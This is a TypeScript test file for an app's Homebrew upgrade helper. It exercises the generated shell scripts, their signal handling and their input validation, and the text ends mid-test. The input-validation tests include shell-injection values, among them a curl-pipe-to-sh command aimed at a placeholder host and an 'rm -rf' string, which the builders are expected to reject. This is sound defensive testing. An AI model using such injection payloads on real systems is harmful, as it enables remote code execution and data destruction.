import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, it, vi } from "vitest";
import {
  BETA_CASK_TOKEN,
  BREW_BINARY_CANDIDATES,
  buildChannelSwitchScript,
  buildUpgradeScript,
  caskroomPath,
  caskVersionPath,
  detectActiveCaskChannel,
  downloadsCacheDir,
  isCaskToken,
  matchCachedDownload,
  createHomebrewUpgrader,
  findBrewBinary,
  parseCaskVersion,
  STABLE_CASK_TOKEN,
  type BrewRunner,
  type CaskToken,
} from "./homebrew";
import type * as NodeChildProcess from "node:child_process";

/**
 * Real `node:child_process` exports are frozen ESM bindings — `vi.spyOn`
 * cannot redefine them in place — so guarding against a rogue subprocess call
 * needs a module mock instead. `execSync`/`execFileSync` are included even
 * though `homebrew.ts` does not import them today: the mock replaces the
 * whole module, so a future direct call to either would hit `undefined`
 * (not a real subprocess) and throw, exactly like the two spied calls below.
 * `vi.mock` is hoisted above every import in this file regardless of where
 * it is written, so placing it after the imports (for import-order lint)
 * does not change when it takes effect.
 */
const {
  childProcessExecFileMock,
  childProcessSpawnMock,
  childProcessExecSyncMock,
  childProcessExecFileSyncMock,
} = vi.hoisted(() => ({
  childProcessExecFileMock: vi.fn(),
  childProcessSpawnMock: vi.fn(),
  childProcessExecSyncMock: vi.fn(),
  childProcessExecFileSyncMock: vi.fn(),
}));

vi.mock("node:child_process", () => ({
  execFile: childProcessExecFileMock,
  spawn: childProcessSpawnMock,
  execSync: childProcessExecSyncMock,
  execFileSync: childProcessExecFileSyncMock,
}));

/**
 * The helpers this module builds are shell scripts, and the thing that went
 * wrong in them was REACHABILITY: `... || exit 1` aborts after the app has
 * already quit, so the restore and the reopen below it never run. No index
 * comparison over the emitted text can catch that — the strings are all
 * present and in the right order; it is control flow that skips them. So
 * these tests execute the real emitted script under `/bin/sh` against stub
 * `brew`/`open`/`pgrep`/`sleep` binaries and read back the trace of what
 * actually ran, with each brew step forced to fail in turn.
 *
 * `node:child_process` is module-mocked above, so `spawnSync` comes from the
 * real module explicitly.
 */
const { spawnSync: realSpawnSync } =
  await vi.importActual<typeof NodeChildProcess>("node:child_process");

type HelperScriptRun = {
  /** `<verb> <token>` per brew call, plus `open <flag> <target>`, in order. */
  readonly trace: readonly string[];
  readonly status: number;
  readonly stderr: string;
};

/**
 * @param failSteps `<verb>:<token>` fails every time; `<verb>:<token>#<n>`
 *   fails only the nth call, which is how "first install fails, retry
 *   succeeds" is expressed.
 */
const runHelperScript = (
  buildScript: (brewBinary: string) => string,
  failSteps: readonly string[] = [],
): HelperScriptRun => {
  const directory = mkdtempSync(path.join(tmpdir(), "fixlang-helper-"));
  const stateDirectory = path.join(directory, "state");
  mkdirSync(stateDirectory);
  const tracePath = path.join(directory, "trace.log");

  const writeStub = (name: string, body: string): string => {
    const file = path.join(directory, name);
    writeFileSync(file, `#!/bin/sh\n${body}\n`, { mode: 0o755 });
    return file;
  };

  const brewStub = writeStub(
    "brew",
    [
      // argv is `<verb> --cask <token>` for every call this module emits.
      'echo "brew $1 $3" >> "$TRACE"',
      'key="$1:$3"',
      "count=0",
      '[ -f "$STATE/$key" ] && count=$(cat "$STATE/$key")',
      "count=$((count + 1))",
      'echo "$count" > "$STATE/$key"',
      "for spec in $FAIL_STEPS; do",
      '  case "$spec" in',
      '    "$key"|"$key#$count") exit 1 ;;',
      "  esac",
      "done",
      "exit 0",
    ].join("\n"),
  );
  // `open`, `pgrep` and `sleep` are absolute paths in the emitted text on
  // purpose (never resolved from PATH), so stubbing them means rewriting
  // those exact literals. brew is a parameter, so it needs no rewriting.
  const script = buildScript(brewStub)
    .replaceAll("/usr/bin/open", writeStub("open", 'echo "open $1 $2" >> "$TRACE"'))
    .replaceAll("/usr/bin/pgrep", writeStub("pgrep", "exit 1"))
    .replaceAll("/bin/sleep", writeStub("sleep", "exit 0"));

  const result = realSpawnSync("/bin/sh", ["-c", script], {
    encoding: "utf8",
    env: {
      ...process.env,
      TRACE: tracePath,
      STATE: stateDirectory,
      FAIL_STEPS: failSteps.join(" "),
    },
  });

  return {
    trace: existsSync(tracePath)
      ? readFileSync(tracePath, "utf8")
          .split("\n")
          .filter((line) => line.length > 0)
      : [],
    status: result.status ?? -1,
    stderr: result.stderr,
  };
};

const APP_PATH = "/Applications/FixLang.app";
const REOPENED = `open -a ${APP_PATH}`;

/**
 * The one thing `runHelperScript` cannot express: a signal arriving while a
 * brew step is still in flight.
 *
 * It has to be asynchronous and it has to outlive the shell, because the whole
 * defect is that the shell dies first and the `brew` child does not — so the
 * trace only becomes conclusive once the ORPHANED child has finished. The brew
 * stub therefore brackets its work with a start and a done line, the signal is
 * sent the moment the start line appears (polled, never a fixed sleep, so a
 * loaded CI box cannot make this flaky), and the trace is read only after the
 * done line lands.
 */
const runHelperScriptAndSignal = async (
  buildScript: (brewBinary: string) => string,
  signal: NodeJS.Signals,
): Promise<{ readonly trace: readonly string[]; readonly stderr: string }> => {
  const { spawn: realSpawn } = await vi.importActual<typeof NodeChildProcess>(
    "node:child_process",
  );
  const directory = mkdtempSync(path.join(tmpdir(), "fixlang-signal-"));
  const tracePath = path.join(directory, "trace.log");

  const writeStub = (name: string, body: string): string => {
    const file = path.join(directory, name);
    writeFileSync(file, `#!/bin/sh\n${body}\n`, { mode: 0o755 });
    return file;
  };

  const brewStub = writeStub(
    "brew",
    [
      'echo "brew-start $1 $3" >> "$TRACE"',
      // Long enough that a reopen racing it is unmistakable in the trace, and
      // deliberately NOT killed by the signal aimed at the shell — that gap is
      // the defect.
      "sleep 2",
      'echo "brew-done $1 $3" >> "$TRACE"',
    ].join("\n"),
  );
  const script = buildScript(brewStub)
    .replaceAll("/usr/bin/open", writeStub("open", 'echo "open $1 $2" >> "$TRACE"'))
    .replaceAll("/usr/bin/pgrep", writeStub("pgrep", "exit 1"))
    .replaceAll("/bin/sleep", writeStub("sleep", "exit 0"));

  const readTrace = (): readonly string[] =>
    existsSync(tracePath)
      ? readFileSync(tracePath, "utf8")
          .split("\n")
          .filter((line) => line.length > 0)
      : [];

  const waitForTraceLine = async (prefix: string): Promise<void> => {
    for (let attempt = 0; attempt < 200; attempt += 1) {
      if (readTrace().some((line) => line.startsWith(prefix))) return;
      await new Promise((resolve) => setTimeout(resolve, 50));
    }
    throw new Error(`Timed out waiting for "${prefix}" in ${readTrace().join(" | ")}`);
  };

  const child = realSpawn("/bin/sh", ["-c", script], {
    env: { ...process.env, TRACE: tracePath },
  });
  let stderr = "";
  child.stderr?.on("data", (chunk: Buffer) => {
    stderr += chunk.toString();
  });
  const exited = new Promise<void>((resolve) => child.on("close", () => resolve()));

  await waitForTraceLine("brew-start");
  child.kill(signal);
  await exited;
  // The shell is gone; the brew child it was waiting on is not. Only once that
  // orphan reports done is "did anything reopen the app while Homebrew was
  // still writing the bundle" an answerable question.
  await waitForTraceLine("brew-done");

  return { trace: readTrace(), stderr };
};

const caskInfoJson = (version: string, token: string = STABLE_CASK_TOKEN): string =>
  JSON.stringify({ casks: [{ token, version }] });

const upgrader = (
  overrides: Partial<{
    isInstalledApp: boolean;
    caskToken: string;
    files: readonly string[];
    directories: readonly string[];
    cacheEntries: readonly string[];
    fileSizes: Readonly<Record<string, number>>;
    runBrew: BrewRunner;
  }> = {},
) => {
  const startDetached = vi.fn();
  const files = new Set(overrides.files ?? ["/opt/homebrew/bin/brew"]);
  const directories = new Set(
    overrides.directories ?? ["/opt/homebrew/Caskroom/fixlang"],
  );
  const runBrew = vi.fn<BrewRunner>(
    overrides.runBrew ?? (() => Promise.resolve(caskInfoJson("0.2.0"))),
  );

  return {
    startDetached,
    runBrew,
    instance: createHomebrewUpgrader({
      isInstalledApp: overrides.isInstalledApp ?? true,
      logFilePath: "/tmp/userData/logs/homebrew-update.log",
      // Overrides come in as `string` so a test can hand this a token the
      // module does not recognize; the cast just satisfies the option's
      // narrower `CaskToken` type — the runtime guard is what is on trial.
      ...(overrides.caskToken === undefined
        ? {}
        : { caskToken: overrides.caskToken as CaskToken }),
      fileExists: (candidate) => files.has(candidate),
      directoryExists: (candidate) => directories.has(candidate),
      cacheDir: "/cache/downloads",
      listDirectory: () => overrides.cacheEntries ?? [],
      fileSize: (candidate) => (overrides.fileSizes ?? {})[candidate] ?? null,
      startDetached,
      runBrew,
    }),
  };
};

describe("Homebrew binary resolution", () => {
  it("never resolves brew from PATH", () => {
    expect([...BREW_BINARY_CANDIDATES]).toEqual([
      "/opt/homebrew/bin/brew",
      "/usr/local/bin/brew",
    ]);
    expect(BREW_BINARY_CANDIDATES.every((candidate) => candidate.startsWith("/"))).toBe(
      true,
    );
  });

  it("prefers the Apple Silicon prefix when both exist", () => {
    expect(findBrewBinary(() => true)).toBe("/opt/homebrew/bin/brew");
  });

  it("falls back to the Intel prefix", () => {
    expect(findBrewBinary((candidate) => candidate === "/usr/local/bin/brew")).toBe(
      "/usr/local/bin/brew",
    );
  });

  it("reports no brew when neither prefix exists", () => {
    expect(findBrewBinary(() => false)).toBeNull();
  });

  it("derives the Caskroom entry from the brew prefix", () => {
    expect(caskroomPath("/opt/homebrew/bin/brew")).toBe(
      "/opt/homebrew/Caskroom/fixlang",
    );
    expect(caskroomPath("/usr/local/bin/brew")).toBe("/usr/local/Caskroom/fixlang");
  });
});

describe("upgrade script", () => {
  const script = buildUpgradeScript("/opt/homebrew/bin/brew");

  it("waits for the app to quit before replacing its bundle", () => {
    expect(script).toContain("/usr/bin/pgrep -x FixLang");
    expect(script.indexOf("pgrep")).toBeLessThan(script.indexOf("upgrade --cask"));
  });

  it("aborts instead of upgrading a still-running app", () => {
    expect(script).toContain('if [ "$waited" -ge 30 ]');
    expect(script).toContain("exit 1");
  });

  it("runs Homebrew non-interactively so it fails instead of hanging", () => {
    expect(script).toContain("export NONINTERACTIVE=1");
  });

  it("upgrades only the fixlang cask and reopens the app", () => {
    expect(script).toContain('"/opt/homebrew/bin/brew" upgrade --cask fixlang');
    expect(script).toContain("/usr/bin/open -b com.fixlang.app");
  });

  it("never automates Gatekeeper or escalates privileges", () => {
    expect(script).not.toMatch(/xattr|sudo|quarantine/);
  });

  /**
   * `open -b` resolves a bundle id, and a stray build in a checkout carries
   * the same one — so it can reopen an older copy of the app right after a
   * successful upgrade. The replaced path is the only unambiguous target.
   */
  it("reopens the exact bundle Homebrew replaced when the path is known", () => {
    const pinned = buildUpgradeScript(
      "/opt/homebrew/bin/brew",
      "/Applications/FixLang.app",
    );

    expect(pinned).toContain('/usr/bin/open -a "/Applications/FixLang.app"');
    // The id survives only as a fallback, after the path attempt.
    expect(pinned.indexOf("open -a")).toBeLessThan(pinned.indexOf("open -b"));
  });

  it("quotes a path containing spaces rather than rejecting it", () => {
    expect(
      buildUpgradeScript("/opt/homebrew/bin/brew", "/Applications/Fix Lang.app"),
    ).toContain('/usr/bin/open -a "/Applications/Fix Lang.app"');
  });

  it.each([
    'relative/FixLang.app',
    '/Applications/FixLang.app"; rm -rf /tmp/x; echo ".app',
    "/Applications/$(whoami).app",
    "/Applications/`id`.app",
    "/Applications/Fix\\Lang.app",
    "/Applications/Fix\nLang.app",
    "/Applications/FixLang",
  ])("falls back to the bundle id for an unsafe path: %s", (appPath) => {
    const fallback = buildUpgradeScript("/opt/homebrew/bin/brew", appPath);

    expect(fallback).not.toContain("open -a \"");
    expect(fallback).toContain("/usr/bin/open -b com.fixlang.app");
  });

  /**
   * REGRESSION: `upgrade --cask ... || exit 1` aborts AFTER the wait loop has
   * confirmed the app is gone, so a failed upgrade used to leave the user
   * with no running app and no explanation — the same shape the channel
   * switch then re-authored three more times. Executing the script proves
   * the reopen is reachable; no index comparison over the text can, because
   * the reopen string is present either way.
   */
  it("reopens the app even when the upgrade itself fails", () => {
    const { trace, status } = runHelperScript(
      (brew) => buildUpgradeScript(brew, APP_PATH),
      ["upgrade:fixlang"],
    );

    expect(trace).toEqual(["brew upgrade fixlang", REOPENED]);
    expect(status).toBe(1);
  });

  it("reopens the app after a successful upgrade", () => {
    expect(runHelperScript((brew) => buildUpgradeScript(brew, APP_PATH))).toMatchObject({
      trace: ["brew upgrade fixlang", REOPENED],
      status: 0,
    });
  });
});

/**
 * REGRESSION: "every exit path reopens the app" was implemented as a single
 * `trap ... EXIT`, and an EXIT trap fires when the shell dies from a signal
 * too. A signal aimed at the helper shell does not reach the `brew` child it
 * is waiting on, so the shell died, ran the trap, and reopened FixLang while
 * the orphaned Homebrew was STILL replacing the bundle — observed by
 * execution at reopen T+1s against `brew-done` at T+4s, on both builders, for
 * TERM and HUP. It is the one exit where the reopen is the harm rather than
 * the repair: it is exactly the mid-replacement launch the wait loop above
 * exists to prevent, and inside the channel switch's no-app window it fell
 * through to `open -b <bundle id>` and started a copy Homebrew then wrote
 * over. The script this replaced (before the trap existed) reopened nothing
 * here.
 *
 * These execute rather than index the text, because "the EXIT trap also
 * covers signals" is a property of `/bin/sh`, not of the string.
 *
 * Note on shells: `runDetached` hands this text to macOS `/bin/sh` (bash),
 * which is the only place this Homebrew helper ever runs. Under a `sh` that
 * does not run EXIT traps for fatal signals at all these assertions hold
 * trivially rather than failing — the mutation that proves they bite has to
 * be run on macOS.
 */
describe("a signal that kills the helper shell must not reopen the app", () => {
  it.each<NodeJS.Signals>(["SIGTERM", "SIGHUP"])(
    "leaves FixLang closed when %s arrives mid-upgrade",
    async (signal) => {
      const { trace, stderr } = await runHelperScriptAndSignal(
        (brew) => buildUpgradeScript(brew, APP_PATH),
        signal,
      );

      expect(trace.filter((line) => line.startsWith("open"))).toEqual([]);
      expect(trace).toContain("brew-done upgrade fixlang");
      // The log is the only channel left, so the exit that leaves the app
      // closed has to say it did.
      expect(stderr).toContain("leaving FixLang closed");
    },
  );

  /**
   * The switch is the worse half: between the uninstall and the install there
   * is no bundle at the recorded path, so the reopen fell through to the
   * bundle id and LaunchServices started whatever other FixLang it could find
   * — which `brew install` then overwrote seconds later.
   */
  it("leaves FixLang closed when a signal arrives mid-switch", async () => {
    const { trace } = await runHelperScriptAndSignal(
      (brew) =>
        buildChannelSwitchScript(brew, STABLE_CASK_TOKEN, BETA_CASK_TOKEN, APP_PATH),
      "SIGTERM",
    );

    expect(trace.filter((line) => line.startsWith("open"))).toEqual([]);
  });

  /**
   * The counterpart, so "does not reopen on a signal" cannot be satisfied by
   * a script that stopped reopening at all: the same builders, unsignalled,
   * still reopen exactly once. Kept next to the tests above because that is
   * the pair that has to stay true together.
   */
  it("still reopens exactly once when no signal arrives", () => {
    expect(
      runHelperScript((brew) => buildUpgradeScript(brew, APP_PATH)).trace,
    ).toEqual(["brew upgrade fixlang", REOPENED]);
    expect(
      runHelperScript(
        (brew) =>
          buildChannelSwitchScript(brew, STABLE_CASK_TOKEN, BETA_CASK_TOKEN, APP_PATH),
        ["install:fixlang@beta"],
      ).trace.filter((line) => line.startsWith("open")),
    ).toEqual([REOPENED]);
  });
});

/**
 * `quitTimeoutMessage` was the one `HelperScriptParts` field with no boundary
 * check: `brewBinary`, `appPath` and both cask tokens are all refused at the
 * builder, while the message was interpolated raw into `echo "..."` — a shape
 * that runs command substitution like any other double-quoted shell string
 * (verified by executing the emitted line form with `$(...)` substituted: the
 * substitution ran). Latent, because the builder is module-private and both
 * call sites pass a literal built from a numeric constant; pinned anyway,
 * because "it is a literal today" is exactly the assumption that expires the
 * day the message comes from a catalog or a profile.
 */
describe("every message the helper echoes is inert shell text", () => {
  const messageLines = (script: string): readonly string[] =>
    script.split("\n").filter((line) => line.trimStart().startsWith('echo "'));

  it.each([
    ["upgrade", buildUpgradeScript("/opt/homebrew/bin/brew", APP_PATH)],
    [
      "channel switch",
      buildChannelSwitchScript(
        "/opt/homebrew/bin/brew",
        STABLE_CASK_TOKEN,
        BETA_CASK_TOKEN,
        APP_PATH,
      ),
    ],
  ])("emits no expansion inside an echoed %s message", (_label, script) => {
    const lines = messageLines(script);

    expect(lines.length).toBeGreaterThan(0);
    for (const line of lines) {
      // Everything between the opening and closing quote of `echo "..."`.
      const body = line.slice(line.indexOf('echo "') + 6, line.lastIndexOf('"'));
      expect(body).not.toMatch(/[`$\\]/);
      expect([...body].every((character) => character >= " ")).toBe(true);
    }
  });
});

/**
 * Tokens and the bundle path are both refused at this boundary rather than
 * trusted by provenance; the brew path was the one value that was not, even
 * though it lands in the same `/bin/sh` text inside a detached helper that is
 * already allowed to uninstall an application. Not reachable from today's
 * callers (`findBrewBinary` returns one of two constants) — the point is that
 * a caller resolving brew from `HOMEBREW_PREFIX` or `which` cannot make it
 * reachable later.
 */
describe("refuses an unsafe brew path before it reaches the shell text", () => {
  it.each([
    "opt/homebrew/bin/brew",
    "/opt/$(curl -s evil.example/x|sh)/bin/brew",
    "/opt/`id`/bin/brew",
    '/opt/homebrew/bin/brew"; rm -rf /tmp/x; "',
    "/opt/home\\brew/bin/brew",
    "/opt/homebrew/bin/\nbrew",
  ])("refuses %s in both builders", (brewBinary) => {
    expect(() => buildUpgradeScript(brewBinary)).toThrow(/unsafe brew path/);
    expect(() =>
      buildChannelSwitchScript(brewBinary, STABLE_CASK_TOKEN, BETA_CASK_TOKEN),
    ).toThrow(/unsafe brew path/);
  });

  it("still accepts both real Homebrew prefixes", () => {
    for (const candidate of BREW_BINARY_CANDIDATES) {
      expect(() => buildUpgradeScript(candidate)).not.toThrow();
    }
  });
});

describe("cask version parsing", () => {
  it("reads the version the tap currently offers", () => {
    expect(parseCaskVersion(caskInfoJson("0.3.5"))).toBe("0.3.5");
  });

  it("ignores other casks in the same payload", () => {
    expect(
      parseCaskVersion(
        JSON.stringify({
          casks: [
            { token: "something-else", version: "9.9.9" },
            { token: "fixlang", version: "0.3.5" },
          ],
        }),
      ),
    ).toBe("0.3.5");
  });

  it.each([
    "",
    "not json",
    JSON.stringify({ casks: [] }),
    JSON.stringify({ casks: [{ token: "fixlang" }] }),
    JSON.stringify({ casks: [{ token: "fixlang", version: 3 }] }),
    JSON.stringify({ formulae: [] }),
  ])("returns null for unusable brew output", (stdout) => {
    expect(parseCaskVersion(stdout)).toBeNull();
  });

  /**
   * REGRESSION: the "refuses to parse against an unknown token" test above
   * feeds `parseCaskVersion` a payload shaped for the STABLE token while
   * asking about "fixlang-nightly" — `cask.token === caskToken` never matches
   * there, so the function returns null whether or not the `isCaskToken`
   * guard runs at all. That test was observed passing IDENTICALLY with the
   * guard deleted, so it pins nothing. This one shapes the payload's own
   * token to match the unrecognized token being asked about: without the
   * guard, `parsed.casks.find(...)` would succeed and return "9.9.9" instead
   * of null.
   */
  it("refuses a version even when the payload's own entry matches the unrecognized token", () => {
    expect(
      parseCaskVersion(caskInfoJson("9.9.9", "fixlang-nightly"), "fixlang-nightly"),
    ).toBeNull();
  });
});

describe("download cache lookup", () => {
  it("matches Homebrew's <digest>--<basename> naming without recomputing it", () => {
    expect(
      matchCachedDownload(
        ["unrelated.dmg", "4cc981a4--FixLang-0.4.6-arm64.dmg"],
        "0.4.6",
      ),
    ).toBe("4cc981a4--FixLang-0.4.6-arm64.dmg");
  });

  it("falls back to the in-progress file", () => {
    expect(
      matchCachedDownload(["4cc981a4--FixLang-0.4.6-arm64.dmg.incomplete"], "0.4.6"),
    ).toBe("4cc981a4--FixLang-0.4.6-arm64.dmg.incomplete");
  });

  it.each([[[], "0.4.6"], [["4cc981a4--FixLang-0.4.5-arm64.dmg"], "0.4.6"]] as const)(
    "returns null when nothing matches",
    (entries, version) => {
      expect(matchCachedDownload(entries, version)).toBeNull();
    },
  );

  it.each(["../etc", "a/b", ""])(
    "refuses an unsafe version rather than building a pattern from it: %s",
    (version) => {
      expect(
        matchCachedDownload([`x--FixLang-${version}-arm64.dmg`], version),
      ).toBeNull();
    },
  );

  it("honours HOMEBREW_CACHE and otherwise uses the macOS default", () => {
    expect(downloadsCacheDir({ HOMEBREW_CACHE: "/custom" })).toBe(
      "/custom/downloads",
    );
    expect(downloadsCacheDir({ HOME: "/Users/x" })).toBe(
      "/Users/x/Library/Caches/Homebrew/downloads",
    );
  });
});

describe("Homebrew upgrader", () => {
  it("enables one-click updates for a cask install", () => {
    expect(upgrader().instance.canInstall).toBe(true);
  });

  it("stays disabled for a manual DMG install with no Caskroom entry", () => {
    expect(upgrader({ directories: [] }).instance.canInstall).toBe(false);
  });

  it("stays disabled when Homebrew is not installed", () => {
    expect(upgrader({ files: [] }).instance.canInstall).toBe(false);
  });

  it("stays disabled for an app running outside Applications", () => {
    expect(upgrader({ isInstalledApp: false }).instance.canInstall).toBe(false);
  });

  it("starts the detached helper with the log destination", () => {
    const { instance, startDetached } = upgrader();

    instance.startUpgrade();

    expect(startDetached).toHaveBeenCalledWith(
      buildUpgradeScript("/opt/homebrew/bin/brew"),
      "/tmp/userData/logs/homebrew-update.log",
    );
  });

  it("refreshes the tap before reading the version it can install", async () => {
    const { instance, runBrew } = upgrader();

    await expect(instance.getInstallableVersion()).resolves.toBe("0.2.0");

    expect(runBrew.mock.calls.map(([, args]) => [...args])).toEqual([
      ["update", "--quiet"],
      ["info", "--cask", "fixlang", "--json=v2"],
    ]);
  });

  it("still reports a version when the tap refresh fails", async () => {
    const { instance } = upgrader({
      runBrew: (_binary, args) =>
        args[0] === "update"
          ? Promise.reject(new Error("offline"))
          : Promise.resolve(caskInfoJson("0.2.0")),
    });

    await expect(instance.getInstallableVersion()).resolves.toBe("0.2.0");
  });

  it("reports an unknown version rather than a wrong one when brew fails", async () => {
    const { instance } = upgrader({
      runBrew: () => Promise.reject(new Error("brew exploded")),
    });

    await expect(instance.getInstallableVersion()).resolves.toBeNull();
  });

  it("never asks brew anything for an install it cannot upgrade", async () => {
    const { instance, runBrew } = upgrader({ directories: [] });

    await expect(instance.getInstallableVersion()).resolves.toBeNull();
    expect(runBrew).not.toHaveBeenCalled();
  });

  it("sees a version Homebrew already staged in the Caskroom", () => {
    const { instance } = upgrader({
      directories: [
        "/opt/homebrew/Caskroom/fixlang",
        "/opt/homebrew/Caskroom/fixlang/0.4.0",
      ],
    });

    expect(instance.isVersionInstalled("0.4.0")).toBe(true);
    expect(instance.isVersionInstalled("0.3.7")).toBe(false);
  });

  it.each(["../../../etc", "0.4.0/../..", "", "a/b", "0.4.0 "])(
    "never lets a version string escape the Caskroom: %s",
    (version) => {
      const { instance } = upgrader();

      expect(instance.isVersionInstalled(version)).toBe(false);
      expect(caskVersionPath("/opt/homebrew/bin/brew", version)).toBeNull();
    },
  );

  it("fetches only the cask download, leaving the installed bundle alone", async () => {
    const { instance, runBrew } = upgrader();

    await instance.downloadUpdate();

    expect(runBrew.mock.calls.map(([, args]) => [...args])).toEqual([
      ["fetch", "--cask", "fixlang"],
    ]);
    // A fetch must never be able to replace the running app.
    expect(runBrew.mock.calls.some(([, args]) => args.includes("upgrade"))).toBe(
      false,
    );
  });

  it("gives the download far longer than the metadata probes", async () => {
    const { instance, runBrew } = upgrader();

    await instance.getInstallableVersion();
    await instance.downloadUpdate();

    const [, , fetchTimeout] = runBrew.mock.calls.at(-1) ?? [];
    const probeTimeouts = runBrew.mock.calls
      .slice(0, -1)
      .map(([, , timeout]) => timeout);

    expect(fetchTimeout).toBeGreaterThan(90_000);
    expect(probeTimeouts.every((timeout) => timeout === undefined)).toBe(true);
  });

  it("refuses to download for an install it cannot upgrade", async () => {
    const { instance, runBrew } = upgrader({ directories: [] });

    await expect(instance.downloadUpdate()).rejects.toThrow(
      "FixLang was not installed with the Homebrew cask",
    );
    expect(runBrew).not.toHaveBeenCalled();
  });

  it("reads progress from the partial download as it grows", () => {
    const { instance } = upgrader({
      cacheEntries: ["abc123--FixLang-0.4.6-arm64.dmg.incomplete"],
      fileSizes: {
        "/cache/downloads/abc123--FixLang-0.4.6-arm64.dmg.incomplete": 42,
      },
    });

    expect(instance.getDownloadedBytes("0.4.6")).toBe(42);
  });

  it("prefers the completed download over a stale partial file", () => {
    const { instance } = upgrader({
      cacheEntries: [
        "abc123--FixLang-0.4.6-arm64.dmg.incomplete",
        "abc123--FixLang-0.4.6-arm64.dmg",
      ],
      fileSizes: {
        "/cache/downloads/abc123--FixLang-0.4.6-arm64.dmg.incomplete": 42,
        "/cache/downloads/abc123--FixLang-0.4.6-arm64.dmg": 128,
      },
    });

    expect(instance.getDownloadedBytes("0.4.6")).toBe(128);
  });

  it("reports nothing cached for another version", () => {
    const { instance } = upgrader({
      cacheEntries: ["abc123--FixLang-0.4.5-arm64.dmg"],
      fileSizes: { "/cache/downloads/abc123--FixLang-0.4.5-arm64.dmg": 128 },
    });

    expect(instance.getDownloadedBytes("0.4.6")).toBeNull();
  });

  it("refuses to run anything when the install is not cask-managed", () => {
    const { instance, startDetached } = upgrader({ directories: [] });

    expect(() => instance.startUpgrade()).toThrow(
      "FixLang was not installed with the Homebrew cask",
    );
    expect(startDetached).not.toHaveBeenCalled();
  });
});

describe("cask tokens", () => {
  it("recognizes only the two published tokens", () => {
    expect(isCaskToken(STABLE_CASK_TOKEN)).toBe(true);
    expect(isCaskToken(BETA_CASK_TOKEN)).toBe(true);
    expect(isCaskToken("fixlang-nightly")).toBe(false);
    expect(isCaskToken("")).toBe(false);
  });
});

describe("token-parameterised Caskroom paths", () => {
  it("derives the beta Caskroom entry from an explicit token", () => {
    expect(caskroomPath("/opt/homebrew/bin/brew", BETA_CASK_TOKEN)).toBe(
      "/opt/homebrew/Caskroom/fixlang@beta",
    );
  });

  it("refuses a token that is not one of the two known constants", () => {
    expect(caskroomPath("/opt/homebrew/bin/brew", "fixlang-nightly")).toBeNull();
  });

  it("derives a beta version directory from an explicit token", () => {
    expect(
      caskVersionPath("/opt/homebrew/bin/brew", "0.33.0-beta.1", BETA_CASK_TOKEN),
    ).toBe("/opt/homebrew/Caskroom/fixlang@beta/0.33.0-beta.1");
  });

  it("refuses an unknown token before building a version path", () => {
    expect(
      caskVersionPath("/opt/homebrew/bin/brew", "0.4.0", "fixlang-nightly"),
    ).toBeNull();
  });

  it("reads the beta cask's version from `brew info` output for an explicit token", () => {
    expect(
      parseCaskVersion(caskInfoJson("0.33.0-beta.1", BETA_CASK_TOKEN), BETA_CASK_TOKEN),
    ).toBe("0.33.0-beta.1");
  });

  it("refuses to parse against an unknown token", () => {
    expect(parseCaskVersion(caskInfoJson("0.2.0"), "fixlang-nightly")).toBeNull();
  });

  it("refuses to build an upgrade script for an unknown token", () => {
    expect(() =>
      buildUpgradeScript("/opt/homebrew/bin/brew", null, "fixlang-nightly"),
    ).toThrow();
  });
});

describe("beta channel probing", () => {
  /**
   * REGRESSION: before the token became an explicit argument, every probe in
   * this file was hard-coded to the stable Caskroom entry, so a beta-token
   * upgrader silently reported the install as un-upgradeable instead of
   * erroring — this is the named failure mode from the card, and this test
   * was seen failing (canInstall === false) against the unmodified code.
   */
  it("probes the beta Caskroom (not the stable one) when configured for the beta channel", () => {
    const { instance } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang@beta"],
    });

    expect(instance.canInstall).toBe(true);
  });

  it("stays disabled for the beta channel when only the stable cask is staged", () => {
    const { instance } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang"],
    });

    expect(instance.canInstall).toBe(false);
  });

  /**
   * REGRESSION: `readInstallableVersion` used to hard-code `--cask fixlang`
   * regardless of which cask the upgrader was created for, so a beta-channel
   * upgrader would silently ask brew about the STABLE cask and could report a
   * stable version as "installable" for a beta check. This test was seen
   * failing (argv contained "fixlang", not "fixlang@beta") against the
   * unmodified code.
   */
  it("passes the beta token, not the stable one, in the `brew info` argv", async () => {
    const { instance, runBrew } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang@beta"],
      runBrew: () => Promise.resolve(caskInfoJson("0.33.0-beta.1", BETA_CASK_TOKEN)),
    });

    await expect(instance.getInstallableVersion()).resolves.toBe("0.33.0-beta.1");

    expect(runBrew.mock.calls.map(([, args]) => [...args])).toEqual([
      ["update", "--quiet"],
      ["info", "--cask", "fixlang@beta", "--json=v2"],
    ]);
  });

  it("passes the beta token in the `brew fetch` argv", async () => {
    const { instance, runBrew } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang@beta"],
    });

    await instance.downloadUpdate();

    expect(runBrew.mock.calls.map(([, args]) => [...args])).toEqual([
      ["fetch", "--cask", "fixlang@beta"],
    ]);
  });

  it("sees a version staged under the beta Caskroom", () => {
    const { instance } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: [
        "/opt/homebrew/Caskroom/fixlang@beta",
        "/opt/homebrew/Caskroom/fixlang@beta/0.33.0-beta.1",
      ],
    });

    expect(instance.isVersionInstalled("0.33.0-beta.1")).toBe(true);
    expect(instance.isVersionInstalled("0.32.0")).toBe(false);
  });

  it("passes the beta token in the upgrade script's argv when starting the upgrade", () => {
    const { instance, startDetached } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang@beta"],
    });

    instance.startUpgrade();

    expect(startDetached).toHaveBeenCalledWith(
      buildUpgradeScript("/opt/homebrew/bin/brew", null, BETA_CASK_TOKEN),
      "/tmp/userData/logs/homebrew-update.log",
    );
  });
});

describe("refuses an unknown cask token before it reaches a path or an argv", () => {
  it("never asks brew anything for an unrecognized token", async () => {
    const { instance, runBrew } = upgrader();

    await expect(
      instance.getInstallableVersion(true, "fixlang-nightly"),
    ).resolves.toBeNull();
    expect(runBrew).not.toHaveBeenCalled();
  });

  it("never checks the filesystem for an unrecognized token", () => {
    const directoryExists = vi.fn(() => true);
    const { instance } = (() => {
      const startDetached = vi.fn();
      const runBrew = vi.fn<BrewRunner>(() => Promise.resolve(caskInfoJson("0.2.0")));
      return {
